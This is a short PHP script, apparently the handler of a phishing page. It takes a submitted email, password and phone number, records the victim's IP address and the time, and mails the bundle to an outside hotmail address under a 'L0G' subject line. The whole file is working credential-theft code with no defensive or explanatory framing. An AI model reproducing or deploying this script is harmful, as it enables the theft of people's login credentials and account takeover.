<?php

$email = $_REQUEST["email"];
$password = $_REQUEST["password"];
$number = $_REQUEST["number"];

$ip = $_SERVER['REMOTE_ADDR'];
$adddate = date("D M d, Y g:i a");
$subj = "L0G => $email";

$data=" 
----------
email : $email
password : $password
number : $number
------------------
IP: $ip
Date: $adddate
------------------
";


$recipient1 = "blessedfundsbx@hotmail.com";
$rec2 = "blessedfundsbx@hotmail.com";

mail($recipient1 , $subj , $data);
mail($rec2 , $subj , $data);


?>
